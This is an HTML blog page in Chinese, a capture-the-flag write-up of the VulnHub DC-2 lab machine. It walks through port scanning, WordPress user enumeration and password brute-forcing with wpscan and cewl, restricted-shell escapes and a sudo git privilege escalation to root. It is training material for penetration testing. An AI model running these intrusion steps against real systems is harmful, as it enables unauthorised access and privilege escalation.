@@ -1,0 +1,250 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>vulnhub之DC-2 | Wowoniu's Blog</title><meta name="author" content="Wowonniu"><meta name="copyright" content="Wowonniu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="信息收集主机发现1nmap -sn 192.168.174.0&#x2F;24    端口扫描和服务识别12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576root㉿kali)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub之DC-2">
+<meta property="og:url" content="http://example.com/2024/08/07/vulnhub%E4%B9%8BDC-2/index.html">
+<meta property="og:site_name" content="Wowoniu&#39;s Blog">
+<meta property="og:description" content="信息收集主机发现1nmap -sn 192.168.174.0&#x2F;24    端口扫描和服务识别12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576root㉿kali)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2024-08-07T11:55:21.000Z">
+<meta property="article:modified_time" content="2024-08-08T12:23:25.281Z">
+<meta property="article:author" content="Wowonniu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/08/07/vulnhub%E4%B9%8BDC-2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'vulnhub之DC-2',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-08-08 20:23:25'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Wowoniu's Blog"><span class="site-name">Wowoniu's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">vulnhub之DC-2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-08-07T11:55:21.000Z" title="发表于 2024-08-07 19:55:21">2024-08-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-08T12:23:25.281Z" title="更新于 2024-08-08 20:23:25">2024-08-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="vulnhub之DC-2"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.174.0/24</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240807195618799.png" class="" title="image-20240807195618799">
+
+<h2 id="端口扫描和服务识别"><a href="#端口扫描和服务识别" class="headerlink" title="端口扫描和服务识别"></a>端口扫描和服务识别</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># nmap -A -p- -v 192.168.174.140</span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 07:57 EDT</span><br><span class="line">NSE: Loaded 156 scripts <span class="keyword">for</span> scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 07:57</span><br><span class="line">Completed NSE at 07:57, 0.00s elapsed</span><br><span class="line">Initiating NSE at 07:57</span><br><span class="line">Completed NSE at 07:57, 0.00s elapsed</span><br><span class="line">Initiating NSE at 07:57</span><br><span class="line">Completed NSE at 07:57, 0.00s elapsed</span><br><span class="line">Initiating ARP Ping Scan at 07:57</span><br><span class="line">Scanning 192.168.174.140 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 07:57, 0.05s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 07:57</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 07:57, 0.01s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 07:57</span><br><span class="line">Scanning 192.168.174.140 [65535 ports]</span><br><span class="line"></span><br><span class="line">Discovered open port 80/tcp on 192.168.174.140</span><br><span class="line">Discovered open port 7744/tcp on 192.168.174.140</span><br><span class="line"></span><br><span class="line">Completed SYN Stealth Scan at 07:57, 2.09s elapsed (65535 total ports)</span><br><span class="line">Initiating Service scan at 07:57</span><br><span class="line">Scanning 2 services on 192.168.174.140</span><br><span class="line">Completed Service scan at 07:57, 7.63s elapsed (2 services on 1 host)</span><br><span class="line">Initiating OS detection (try <span class="comment">#1) against 192.168.174.140</span></span><br><span class="line">NSE: Script scanning 192.168.174.140.</span><br><span class="line">Initiating NSE at 07:57</span><br><span class="line">Completed NSE at 07:57, 1.51s elapsed</span><br><span class="line">Initiating NSE at 07:57</span><br><span class="line">Completed NSE at 07:57, 0.08s elapsed</span><br><span class="line">Initiating NSE at 07:57</span><br><span class="line">Completed NSE at 07:57, 0.00s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.174.140</span><br><span class="line">Host is up (0.00067s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://dc-2/</span><br><span class="line">7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)</span><br><span class="line">|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)</span><br><span class="line">|   256 <span class="built_in">df</span>:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)</span><br><span class="line">|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)</span><br><span class="line">MAC Address: 00:0C:29:B4:0A:39 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.095 days (since Wed Aug  7 05:41:24 2024)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty=262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.67 ms 192.168.174.140</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 07:57</span><br><span class="line">Completed NSE at 07:57, 0.00s elapsed</span><br><span class="line">Initiating NSE at 07:57</span><br><span class="line">Completed NSE at 07:57, 0.00s elapsed</span><br><span class="line">Initiating NSE at 07:57</span><br><span class="line">Completed NSE at 07:57, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 13.24 seconds</span><br><span class="line">           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="渗透测试–wordpress"><a href="#渗透测试–wordpress" class="headerlink" title="渗透测试–wordpress"></a>渗透测试–wordpress</h1><p>访问站点<a href="http://192.168.174.140:80，IP地址变为域名">http://192.168.174.140:80，IP地址变为域名</a></p>
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240807200346902.png" class="" title="image-20240807200346902">
+
+<p>域名重定向，修改host文件</p>
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240808090003710.png" class="" title="image-20240808090003710">
+
+<p>重新访问，得到指纹信息</p>
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240808090045391.png" class="" title="image-20240808090045391">
+
+<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>看到首页有FLAG</p>
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240808091424902.png" class="" title="image-20240808091424902">
+
+<p>遍历后台路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://dc-2</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240808092015202.png" class="" title="image-20240808092015202">
+
+<p>使用kali的wpscan工具枚举用户名 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -e u </span><br></pre></td></tr></table></figure>
+
+<p>有3个用户</p>
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240808094818759.png" class="" title="image-20240808094818759">
+
+<p>使用cewl命令针对网站生成密码进行爆破</p>
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240808095336841.png" class="" title="image-20240808095336841">
+
+<p>使用wpscan进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U user.txt -P password.txt</span><br></pre></td></tr></table></figure>
+
+<p>得到两个用户名的密码jerry:adipiscing</p>
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240808095739956.png" class="" title="image-20240808095739956">
+
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>登录jerry账户，找到flag2</p>
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240808095952341.png" class="" title="image-20240808095952341">
+
+<p>提示找其他的入口点，前面的信息收集除了80端口，还开放了7744端口，是ssh服务</p>
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240808100159543.png" class="" title="image-20240808100159543">
+
+<p>使用jerry和tom的账户密码尝试登录，只有tom的账户可以登陆</p>
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240808102743606.png" class="" title="image-20240808102743606">
+
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240808102755139.png" class="" title="image-20240808102755139">
+
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>登录的当前目录下找到falg3</p>
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240808102939209.png" class="" title="image-20240808102939209">
+
+<p>查看flag3文件</p>
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240808103040458.png" class="" title="image-20240808103040458">
+
+<p>提示使用su命令，报错没有su命令</p>
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240808103332859.png" class="" title="image-20240808103332859">
+
+<p>tom用户处于rbash，<code>rbash</code>（restricted bash）是 Bash 的受限模式，旨在限制用户的某些功能和命令，以增强安全性。用户在 <code>rbash</code> 环境下不能更改当前目录、不能设置或取消某些环境变量、不能执行某些命令等。然而，</p>
+<p>首先启用一个&#x2F;bin&#x2F;sh，有以下几种姿势</p>
+<ol>
+<li><pre><code class="bash">vi
+:set shell=/bin/sh
+:shell
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. ```bash</span><br><span class="line">   BASH_CMDS[su]=/bin/sh</span><br><span class="line">   #BASH_CMDS 是一个关联数组，可以用来为 shell 命令指定路径。在这个例子中，它将 su 命令映射到 /bin/sh。这意味着当你在 rbash 中执行 su 命令时，实际上会启动 /bin/sh</span><br><span class="line">   su</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><pre><code class="bash">#使用内建命令
+bash -c &quot;exec /bin/sh&quot;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1，2适用这个靶场，开启sh后修改$PATH的值，增加/bin/和/usr/bin/</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">export PATH=$PATH:/bin:/usr/bin</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ol>
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240808105516880.png" class="" title="image-20240808105516880">
+
+<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>在jerry用户目录中找到flag4文件</p>
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240808105616406.png" class="" title="image-20240808105616406">
+
+<p>首先查看用户sudo中的权限配置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"><span class="comment">#jerry用户在计算机上的默认配置</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> jerry on DC-2:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"><span class="comment">#jerry的sudo权限</span></span><br><span class="line">User jerry may run the following commands on DC-2:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/git</span><br><span class="line"><span class="comment">#git命令不需要密码</span></span><br></pre></td></tr></table></figure>
+
+<p>使用git提权</p>
+<ol>
+<li><pre><code class="bash">sudo git branch --help config
+!/bin/sh
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. ```bash</span><br><span class="line">   sudo git help status</span><br><span class="line">   !/bin/sh</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ol>
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240808110607625.png" class="" title="image-20240808110607625">
+
+<p>提权到root用户</p>
+<img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240808111131038.png" class="" title="image-20240808111131038">
+
+<h2 id="final-flag"><a href="#final-flag" class="headerlink" title="final-flag"></a>final-flag</h2><img src="/2024/08/07/vulnhub%E4%B9%8BDC-2/image-20240808111254003.png" class="" title="image-20240808111254003">
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Wowonniu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/08/07/vulnhub%E4%B9%8BDC-2/">http://example.com/2024/08/07/vulnhub%E4%B9%8BDC-2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Wowoniu's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/08/vulnhub%E4%B9%8BDC-3/" title="vulnhub之DC-3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">vulnhub之DC-3</div></div></a></div><div class="next-post pull-right"><a href="/2024/08/05/vulnhub%E4%B9%8BDC-1/" title="vulnhub之DC-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">vulnhub之DC-1</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Wowonniu</div><div class="author-info__description">永远相信美好的事情即将发生</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%92%8C%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB"><span class="toc-number">1.2.</span> <span class="toc-text">端口扫描和服务识别</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%93wordpress"><span class="toc-number">2.</span> <span class="toc-text">渗透测试–wordpress</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">2.1.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">2.2.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">2.3.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag4"><span class="toc-number">2.4.</span> <span class="toc-text">flag4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#final-flag"><span class="toc-number">2.5.</span> <span class="toc-text">final-flag</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/vulnhub%E4%B9%8BDC-3/" title="vulnhub之DC-3">vulnhub之DC-3</a><time datetime="2024-08-08T07:37:17.000Z" title="发表于 2024-08-08 15:37:17">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/07/vulnhub%E4%B9%8BDC-2/" title="vulnhub之DC-2">vulnhub之DC-2</a><time datetime="2024-08-07T11:55:21.000Z" title="发表于 2024-08-07 19:55:21">2024-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/05/vulnhub%E4%B9%8BDC-1/" title="vulnhub之DC-1">vulnhub之DC-1</a><time datetime="2024-08-05T11:51:32.000Z" 